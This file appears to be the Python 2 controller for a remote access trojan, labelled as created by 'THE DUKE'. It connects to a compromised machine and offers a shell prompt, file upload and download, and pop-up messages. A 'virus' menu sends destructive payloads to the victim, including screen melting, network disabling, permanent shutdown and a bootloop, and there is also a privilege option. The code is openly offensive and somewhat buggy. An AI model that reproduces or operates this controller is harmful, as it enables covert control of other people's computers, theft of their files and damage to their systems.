import socket
import os
import sys
import base64

print '''

======================================================
======================================================
================ CREATED BY THE DUKE =================
======================================================
======================================================

Great power Comes Great Responsiblity
                            -Uncle Ben

Support us! SOLO

'''
if len(sys.argv[1]) == 0:
    print 'lalala'
    quit()
MYNAME = sys.argv[0]
HOST = sys.argv[1]
PORT = int(sys.argv[2])
LPORT = 9010

def download(FILENAME):
    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.connect((HOST, LPORT))
    sock.send(FILENAME)
    ifexist = sock.recv(1024)
    if ifexist == 'True':
        size = sock.recv(1024)
        opt = raw_input(' File do exist and is ' + size + 'B Do you want it? \n [y/n] >>')
        if opt == 'y':
         try:
            sock.send('GETIT')
            f= open(FILENAME , 'wb')
            data = sock.recv(1024)
            while True:
                f.write(data)
                data = sock.recv(1024)
                if data == 'ENDOFTHELINE':
                    break           
            sock.close()
         except KeyboardInterrupt:
            print 'DONE'
def upload(FILENAME):
    import socket, os
    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, LPORT))
    sock.listen(10)
    print ' 3Waiting...' 
    c, addr = sock.accept()
    print ' [+] Connected!'
    FILENAME = c.recv(1024)
    if os.path.isfile(FILENAME) == True:
        c.sendall('True')
        size = os.path.getsize(FILENAME)
        c.sendall(str(size))
        opt = c.recv(1024)
        if opt == 'GETIT':
            f = open(FILENAME , 'rb')
            data = f.read(1024)
            while data != '':
                c.sendall(data)
                data = f.read(1024)
            c.sendall('ENDOFTHELINE')
            print 'DONE'
    else:
        c.sendall('nOPE')
    sock.close()

def usage():
    print '''usage:
                    python server.py [HOST IP] [HOST PORT]'''
    quit('exiting...')
def main():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    data = s.recv(1024)
    print data

    while True:
        try:
            command = raw_input('$')
            if command == 'upload':
                    s.send(command)
                    FILENAME = raw_input(' File NAME :')
                    s.send(FILENAME)
                    upload(FILENAME)
            elif command == 'message':
                    s.send(command)
                    s.send(raw_input('Message >> '))
                    s.send(raw_input('Title >> '))
                    print '''
    1: OK and Cancel
    2: Abort, Retry, Ignore
    3: Yes, No, Cancel
    4: Yes and No
    5: Retry and Cancel
    16: Critical message icon
    32: Warning query icon
    48: Warning message icon
    64: Information message icon
    4096: Always stay on top of the desktop
'''
                    s.send(raw_input('Button >>'))
            elif command == 'download':
                    s.send(command)
                    FILENAME = raw_input(' File Name :')
                    s.send(FILENAME)
                    download(FILENAME)
            elif command == 'virus':
                    s.send(command)
                    print '''

    SLNO NAME          Description
     1) cdpop        :  INSTANTLY POPS OUT CD
     2) flashscreen  :  KEEPS FLASHING THE SCREEN
     3) meltdown     :  SYSTEM SCREEN STARTS TO MELT
     4) DisableINET  :  NETWORK WILL BE DISABLED YOU MAY LOOSE THE CONN
     5) 4eversleep   :  SYSTEM SHUTS DOWN 4 EVER
     6) shutitdown   :  BOOTLOOP
     7) LEAVE BLANK LET HIM LIVE HIS LIFE
    Enter your choice >>'''
                    virusname = raw_input(" >> ")
                    s.send(virusname)
                    print s.recv(1024)
            elif command == 'giveprivilege':
                    FILENAME = raw_input(' Enter the FileName: ')
                    c.sendall(FILENAME)
                    print c.recv(1024)
            elif command == '':
                    pass
            else:
                    if command == 'download':
                        pass
                    elif command == 'upload':
                        pass
                    else:
                        s.send(command)
                    data = s.recv(1024)
            print data
        except KeyboardInterrupt:
            pass
main()
